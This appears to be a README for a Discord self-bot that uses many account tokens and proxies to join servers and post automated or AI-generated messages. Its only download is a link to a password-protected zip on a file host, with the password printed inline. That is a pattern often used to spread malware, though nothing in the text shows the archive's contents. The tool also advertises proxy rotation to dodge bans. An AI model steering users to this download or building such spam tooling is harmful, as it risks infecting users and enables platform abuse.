# 🤖 Discord Automation Bot 

<p align="center">
  <img src="https://github.com/MeoMunDep/Discord-Autobot/blob/main/IMAGE/DISCORD_MEOMUNDEP_CLI.png?raw=true" width="600" />
</p>

---

## 🌐 Overview

This bot automates interactions on **Discord**, including sending messages, joining/leaving servers, and handling messages using **multiple accounts** with **proxy support**.

---
# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
## PASSWORD: 1322
## 🚀 Features

- 💬 **Auto Messaging** — Sends messages to specified channels
- ➕ **Auto Join Servers** — Joins servers using invite links
- ➖ **Auto Leave Servers** — Leaves specified servers
- 🌍 **Proxy Support** — Supports HTTP(S) and SOCKS5 proxies
- 🗑️ **Auto Message Deletion** — Deletes sent messages after a configurable delay
- 🌐 **Multi-language Support** — Configurable message language
- 📕 **Error Logging** — Saves IDs of servers or channels where errors occurred
- 🤖 **AI Replies** — Generate casual responses using AI providers (Groq, OpenRouter, Gemini, Poe)
- 🖼️ **Image Generation** — Generate and send AI images to channels using Freepik API
- 🎛️ **Server Control** — Enable/disable individual servers without deleting configuration









## ⚙️ How Bot Processes Servers

1. **Read `servers.json`** - Loads all server configurations
2. **Check `enabled`** - Skips servers with `enabled: false`
3. **Join Server** (if `join_server: true` in configs) - Uses `invite_id`
4. **Process Channels** (if `auto_chat: true` in configs):
   - Processes `raw_chat` channels → Sends text messages
   - Processes `command_chat` channels → Executes commands
   - Processes `image_chat` channels → Generates and sends images
5. **Leave Server** (if `leave_server: true` in configs) - Uses `guild_id`
6. **Repeat** for next server

---

## 💡 Tips & Best Practices

### ✅ DO:
- Use descriptive names for servers to easily identify them
- Set `enabled: false` to temporarily disable servers without losing configuration
- Leave channel categories empty `{}` if not using them
- Use `"__random_message"` for more natural, varied conversations
- Test with one server first before adding multiple servers

### ❌ DON'T:
- Don't delete server entries - use `enabled: false` instead
- Don't put channel IDs in quotes within objects (they're already strings)
- Don't forget commas between objects in arrays
- Don't use invalid JSON syntax (use a JSON validator if unsure)

---

## 🔍 Finding Channel IDs

1. Enable Developer Mode in Discord (Settings → Advanced → Developer Mode)
2. Right-click on any channel
3. Click "Copy Channel ID"
4. Paste the ID into `servers.json`



---

## 🐛 Troubleshooting

| Problem | Solution |
|---------|----------|
| Bot skips server | Check `enabled: true` is set |
| Bot doesn't join server | Check `invite_id` is correct and `join_server: true` in configs |
| Bot doesn't send messages | Check channel IDs are correct and `auto_chat: true` in configs |
| Images not generating | Check Freepik API key in configs.json (or bot will use free Pollinations.ai) |
| JSON syntax error | Use a JSON validator like jsonlint.com |

</details>

---



---

### 🔍 How It Works

1. **Reads configuration** from `configs.json`
2. **Logs in** using provided tokens from `tokens.txt`
3. **Applies proxy** per account (if available in `proxies.txt`)
4. **Processes each server** from `servers.json`:
   - ✅ Checks if server is `enabled: true`
   - ➕ Joins server (using `invite_id`) if `join_server: true`
   - 💬 Sends messages/commands/images to channels if `auto_chat: true`
   - ➖ Leaves server (using `guild_id`) if `leave_server: true`
5. **Logs every event** with timestamps and colored output
6. **Waits for delays** between actions (configurable)
7. **Repeats automatically** after `timeToRestartAllAccounts` seconds

---

### 📝 Logs and Timestamps

- Each log entry includes a timestamp
- Timestamp format follows `chat_language` setting
- Color-coded logs for easy reading:
  - 🟢 Green - Success
  - 🔴 Red - Error
  - 🟡 Yellow - Warning
  - 🔵 Blue - Info
  - 🟣 Purple - Processing

---

### ⚠️ Important Notes

- ✅ Ensure all tokens are valid and have required permissions
- 🌐 Use proxies to avoid rate limits or bans (one proxy per token recommended)
- ⏱️ Tune delay settings carefully for larger account sets
- 📊 Monitor logs for errors and adjust `servers.json` accordingly
- 🔒 Keep your tokens and API keys private and secure
- 🚫 Don't share your `tokens.txt` file with anyone
- 💾 Bot automatically saves errors to `error_channels.json` to avoid retrying failed channels

</details>

---


---

## 📜 License

❗ **Do not steal or copy this project.**
💀 **Use it at your own risk.**
🚫 **Don't DM me with silly questions.**

---

<p align="center"><a href="#-discord-automation-bot-by-meomundep">⬆️ Back to top</a></p>
